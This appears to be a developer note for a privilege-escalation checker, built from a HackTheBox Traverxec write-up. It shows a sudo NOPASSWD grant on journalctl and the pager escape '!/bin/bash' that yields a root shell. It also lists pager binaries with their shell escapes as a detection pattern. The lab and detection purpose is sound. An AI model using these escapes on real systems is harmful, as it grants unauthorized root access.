# HTB Traverxec: sudo NOPASSWD journalctl (pager escape)

**Platform:** HackTheBox
**Machine:** Traverxec
**Source:** https://medium.com/@Inching-Towards-Intelligence/htb-traverxec-f4392cff91d6
**Year:** ~2023 writeup (box released 2019)
**Category:** GTFOBins-style sudo pager escape (distinct from basic NOPASSWD ALL)

## Context
User `david` has a `bin/server-stats.sh` script that calls `journalctl` with sudo
via `sudo -l` grant. journalctl invokes the default pager (`less`), which can
be escaped to spawn a root shell: a GTFOBins technique not covered by simple
"NOPASSWD: ALL" detection.

## sudo -l Output (as referenced in writeup)
```
david@traverxec:~/bin$ sudo -l
User david may run the following on traverxec:
    (root) NOPASSWD: /usr/bin/journalctl -n5 -unostromo.service
```
(Also visible directly in the script `server-stats.sh`, which calls journalctl.)

## Exploit Command
```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```
Then, inside the pager that opens:
```
!/bin/bash
```
Result:
```
root@traverxec:/home/david/bin# whoami
root
```

## Detection Pattern
Regex-friendly signal: a `sudo -l` entry granting NOPASSWD on `journalctl`,
`less`, `more`, `man`, `pg`, `systemctl status`, or any other GTFOBins
"pager-invoking" binary: distinct from binaries that grant a shell directly
(vim, find, etc.). Detection should map the specific binary name to its
GTFOBins escape sequence:
  - journalctl → `!/bin/bash` (inside pager, or `-n5` won't paginate if lines fit: force with no `--no-pager`)
  - less/more/man/pg → `!/bin/sh` inside pager
  - systemctl status <svc> → same pager escape

## Notes for ReadPEAS
This is NOT the same as the already-covered "sudo NOPASSWD" flat GTFOBins
lookup if the current GTFOBins DB only maps binary → direct command. Pager
binaries need a **two-step** exploit chain: run the sudo command, THEN send
the escape sequence into the resulting pager. If ReadPEAS's sudo module
currently emits a single command per GTFOBins entry, verify it correctly
outputs the multi-step form for pager-based binaries (journalctl, less,
more, man, pg, view, awk, git, etc.).
